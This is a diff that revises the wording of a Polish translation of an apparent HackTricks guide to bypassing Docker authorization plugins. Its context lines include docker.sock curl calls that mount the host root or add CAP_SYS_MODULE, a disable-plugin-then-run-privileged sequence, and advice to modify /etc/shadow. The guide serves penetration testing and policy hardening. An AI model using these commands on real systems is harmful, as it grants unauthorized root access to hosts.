@@ -14,15 +14,15 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 {% endhint %}
 
 
-Model **autoryzacji** Dockera z pudełka jest **wszystko albo nic**. Każdy użytkownik z uprawnieniami do uzyskania dostępu do demona Dockera może **wykonać dowolne** polecenie klienta Dockera. To samo dotyczy wywołań korzystających z API silnika Dockera do kontaktu z demonem. Jeśli potrzebujesz **większej kontroli dostępu**, możesz stworzyć **wtyczki autoryzacji** i dodać je do konfiguracji demona Dockera. Korzystając z wtyczki autoryzacji, administrator Dockera może **konfigurować szczegółowe polityki dostępu** do zarządzania dostępem do demona Dockera.
+**Model** **autoryzacji** **Docker** jest **wszystko albo nic**. Każdy użytkownik z uprawnieniami do uzyskania dostępu do demona Docker może **wykonać dowolne** polecenie klienta Docker. To samo dotyczy wywołań korzystających z API silnika Docker do kontaktu z demonem. Jeśli potrzebujesz **większej kontroli dostępu**, możesz stworzyć **wtyczki autoryzacji** i dodać je do konfiguracji demona Docker. Korzystając z wtyczki autoryzacji, administrator Docker może **konfigurować szczegółowe polityki dostępu** do zarządzania dostępem do demona Docker.
 
 # Podstawowa architektura
 
-Wtyczki autoryzacji Dockera to **zewnętrzne** **wtyczki**, które możesz wykorzystać do **zezwalania/odmawiania** **działań** żądanych do demona Dockera **w zależności** od **użytkownika**, który je żąda, oraz **żądanej** **akcji**.
+Wtyczki autoryzacji Docker to **zewnętrzne** **wtyczki**, które możesz wykorzystać do **zezwalania/odmawiania** **działań** żądanych do demona Docker **w zależności** od **użytkownika**, który je żąda, oraz **żądanej** **akcji**.
 
 **[Poniższe informacje pochodzą z dokumentacji](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-Gdy **żądanie HTTP** jest wysyłane do demona Dockera przez CLI lub za pośrednictwem API silnika, **podsystem** **uwierzytelniania** **przekazuje** żądanie do zainstalowanej **wtyczki** **uwierzytelniania**. Żądanie zawiera użytkownika (wywołującego) i kontekst polecenia. **Wtyczka** jest odpowiedzialna za podjęcie decyzji, czy **zezwolić** czy **odmówić** żądanie.
+Gdy **żądanie HTTP** jest wysyłane do demona Docker przez CLI lub za pośrednictwem API silnika, **podsystem** **uwierzytelniania** **przekazuje** żądanie do zainstalowanej **wtyczki uwierzytelniania**. Żądanie zawiera użytkownika (wywołującego) i kontekst polecenia. **Wtyczka** jest odpowiedzialna za podjęcie decyzji, czy **zezwolić** czy **odmówić** żądanie.
 
 Poniższe diagramy sekwencyjne przedstawiają przepływ autoryzacji zezwalającej i odmawiającej:
 
@@ -32,13 +32,13 @@ Poniższe diagramy sekwencyjne przedstawiają przepływ autoryzacji zezwalające
 
 Każde żądanie wysyłane do wtyczki **zawiera uwierzytelnionego użytkownika, nagłówki HTTP oraz ciało żądania/odpowiedzi**. Tylko **nazwa użytkownika** i **metoda uwierzytelniania** są przekazywane do wtyczki. Co najważniejsze, **żadne** dane **uwierzytelniające** użytkownika ani tokeny nie są przekazywane. Na koniec, **nie wszystkie ciała żądań/odpowiedzi są wysyłane** do wtyczki autoryzacji. Tylko te ciała żądań/odpowiedzi, w których `Content-Type` to `text/*` lub `application/json`, są wysyłane.
 
-Dla poleceń, które mogą potencjalnie przejąć połączenie HTTP (`HTTP Upgrade`), takich jak `exec`, wtyczka autoryzacji jest wywoływana tylko dla początkowych żądań HTTP. Gdy wtyczka zatwierdzi polecenie, autoryzacja nie jest stosowana do reszty przepływu. W szczególności dane strumieniowe nie są przekazywane do wtyczek autoryzacji. Dla poleceń, które zwracają odpowiedzi HTTP w kawałkach, takich jak `logs` i `events`, tylko żądanie HTTP jest wysyłane do wtyczek autoryzacji.
+Dla poleceń, które mogą potencjalnie przejąć połączenie HTTP (`HTTP Upgrade`), takich jak `exec`, wtyczka autoryzacji jest wywoływana tylko dla początkowych żądań HTTP. Gdy wtyczka zatwierdzi polecenie, autoryzacja nie jest stosowana do reszty przepływu. W szczególności, dane strumieniowe nie są przekazywane do wtyczek autoryzacji. Dla poleceń, które zwracają odpowiedzi HTTP w kawałkach, takich jak `logs` i `events`, tylko żądanie HTTP jest wysyłane do wtyczek autoryzacji.
 
-Podczas przetwarzania żądań/odpowiedzi, niektóre przepływy autoryzacji mogą wymagać dodatkowych zapytań do demona Dockera. Aby zakończyć takie przepływy, wtyczki mogą wywoływać API demona podobnie jak zwykły użytkownik. Aby umożliwić te dodatkowe zapytania, wtyczka musi zapewnić administratorowi środki do skonfigurowania odpowiednich polityk uwierzytelniania i bezpieczeństwa.
+Podczas przetwarzania żądań/odpowiedzi, niektóre przepływy autoryzacji mogą wymagać dodatkowych zapytań do demona Docker. Aby zakończyć takie przepływy, wtyczki mogą wywoływać API demona podobnie jak zwykły użytkownik. Aby umożliwić te dodatkowe zapytania, wtyczka musi zapewnić środki dla administratora do skonfigurowania odpowiednich polityk uwierzytelniania i bezpieczeństwa.
 
 ## Kilka wtyczek
 
-Jesteś odpowiedzialny za **rejestrowanie** swojej **wtyczki** jako część **uruchamiania** demona Dockera. Możesz zainstalować **wiele wtyczek i połączyć je w łańcuch**. Ten łańcuch może być uporządkowany. Każde żądanie do demona przechodzi w kolejności przez łańcuch. Tylko gdy **wszystkie wtyczki przyznają dostęp** do zasobu, dostęp jest przyznawany.
+Jesteś odpowiedzialny za **rejestrowanie** swojej **wtyczki** jako część **uruchamiania** demona Docker. Możesz zainstalować **wiele wtyczek i połączyć je w łańcuch**. Ten łańcuch może być uporządkowany. Każde żądanie do demona przechodzi w kolejności przez łańcuch. Tylko gdy **wszystkie wtyczki przyznają dostęp** do zasobu, dostęp jest przyznawany.
 
 # Przykłady wtyczek
 
@@ -48,7 +48,7 @@ Wtyczka [**authz**](https://github.com/twistlock/authz) pozwala na stworzenie pr
 
 To jest przykład, który pozwoli Alicji i Bobowi na tworzenie nowych kontenerów: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
 
-Na stronie [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) możesz znaleźć powiązanie między żądanym URL a akcją. Na stronie [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) możesz znaleźć powiązanie między nazwą akcji a akcją.
+Na stronie [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) możesz znaleźć relację między żądanym URL a akcją. Na stronie [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) możesz znaleźć relację między nazwą akcji a akcją.
 
 ## Prosty samouczek dotyczący wtyczek
 
@@ -56,7 +56,7 @@ Możesz znaleźć **łatwą do zrozumienia wtyczkę** z szczegółowymi informac
 
 Przeczytaj `README` i kod `plugin.go`, aby zrozumieć, jak to działa.
 
-# Ominięcie wtyczki autoryzacji Dockera
+# Ominięcie wtyczki autoryzacji Docker
 
 ## Wyliczanie dostępu
 
@@ -108,12 +108,12 @@ Zauważ, że być może nie możesz zamontować folderu `/tmp`, ale możesz zamo
 
 **Zauważ, że nie wszystkie katalogi w maszynie linuxowej będą wspierać bit suid!** Aby sprawdzić, które katalogi wspierają bit suid, uruchom `mount | grep -v "nosuid"` Na przykład zazwyczaj `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` i `/var/lib/lxcfs` nie wspierają bitu suid.
 
-Zauważ również, że jeśli możesz **zamontować `/etc`** lub jakikolwiek inny folder **zawierający pliki konfiguracyjne**, możesz je zmienić z kontenera docker jako root, aby **wykorzystać je na hoście** i eskalować uprawnienia (może modyfikując `/etc/shadow`)
+Zauważ również, że jeśli możesz **zamontować `/etc`** lub jakikolwiek inny folder **zawierający pliki konfiguracyjne**, możesz je zmienić z kontenera docker jako root, aby **wykorzystać je w hoście** i eskalować uprawnienia (może modyfikując `/etc/shadow`)
 {% endhint %}
 
 ## Niezweryfikowany punkt końcowy API
 
-Odpowiedzialnością administratora systemu konfigurowania tej wtyczki byłoby kontrolowanie, które akcje i z jakimi uprawnieniami każdy użytkownik może wykonywać. Dlatego, jeśli administrator przyjmie podejście **czarnej listy** z punktami końcowymi i atrybutami, może **zapomnieć o niektórych z nich**, co mogłoby pozwolić atakującemu na **eskalację uprawnień.**
+Odpowiedzialnością sysadmina konfigurowania tej wtyczki byłoby kontrolowanie, które akcje i z jakimi uprawnieniami każdy użytkownik może wykonywać. Dlatego, jeśli administrator przyjmie podejście **czarnej listy** z punktami końcowymi i atrybutami, może **zapomnieć o niektórych z nich**, co mogłoby pozwolić atakującemu na **eskalację uprawnień.**
 
 Możesz sprawdzić API dockera w [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
 
@@ -121,7 +121,7 @@ Możesz sprawdzić API dockera w [https://docs.docker.com/engine/api/v1.40/#](ht
 
 ### Binds w root
 
-Możliwe, że gdy administrator systemu konfigurował zaporę docker, **zapomniał o niektórym ważnym parametrze** [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) takim jak "**Binds**".\
+Możliwe, że gdy sysadmin konfigurował zaporę docker, **zapomniał o niektórym ważnym parametrze** [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) takim jak "**Binds**".\
 W poniższym przykładzie możliwe jest wykorzystanie tej błędnej konfiguracji do stworzenia i uruchomienia kontenera, który montuje folder root (/) hosta:
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
@@ -156,7 +156,7 @@ curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '
 ```
 ## Unchecked JSON Attribute
 
-Możliwe, że gdy administrator systemu konfigurował zaporę docker, **zapomniał o niektórym ważnym atrybucie parametru** [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) takim jak "**Capabilities**" wewnątrz "**HostConfig**". W poniższym przykładzie możliwe jest wykorzystanie tej błędnej konfiguracji do stworzenia i uruchomienia kontenera z uprawnieniem **SYS\_MODULE**:
+Możliwe, że gdy administrator systemu skonfigurował zaporę docker, **zapomniał o niektórym ważnym atrybucie parametru** [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) takim jak "**Capabilities**" wewnątrz "**HostConfig**". W poniższym przykładzie można wykorzystać tę błędną konfigurację do stworzenia i uruchomienia kontenera z uprawnieniem **SYS\_MODULE**:
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
@@ -184,7 +184,7 @@ docker plugin disable authobot
 docker run --rm -it --privileged -v /:/host ubuntu bash
 docker plugin enable authobot
 ```
-Pamiętaj, aby **ponownie włączyć wtyczkę po eskalacji**, w przeciwnym razie **ponowne uruchomienie usługi docker nie zadziała**!
+Pamiętaj, aby **ponownie włączyć wtyczkę po eskalacji**, inaczej **ponowne uruchomienie usługi docker nie zadziała**!
 
 ## Opisy obejścia wtyczki autoryzacji
 
@@ -200,7 +200,7 @@ Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-
 
 * Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Dziel się sztuczkami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
+* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.
 
 </details>
 {% endhint %}
